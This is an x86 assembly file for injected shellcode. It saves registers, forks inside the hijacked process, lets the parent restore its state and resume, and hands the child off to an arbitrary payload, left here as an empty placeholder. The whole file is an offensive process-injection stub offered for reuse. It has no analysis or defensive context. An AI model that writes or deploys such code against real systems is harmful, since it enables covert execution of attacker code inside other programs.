/* 	This is the injected shellcode		*/

.globl injected_shellcode

injected_shellcode: 	/* ret location has been pushed previously	*/
	nop
	nop
	pusha           /* save before anything		*/
	xor %eax,%eax
	mov $0x02,%al  	/* sys_fork			*/
	int $0x80       /* fork()			*/
	xor %ebx,%ebx
	cmp %eax,%ebx   /* father or son ?		*/
	je  son         /* I'm son			*/

father: 		/* I'm the father, I've to restore my previous state */
	popa
	ret 		/* Old values restored, Now return 	*/
			/* code finished for father		*/		

son:			/* standard shellcode, at your choice 	*/
	.string ""	
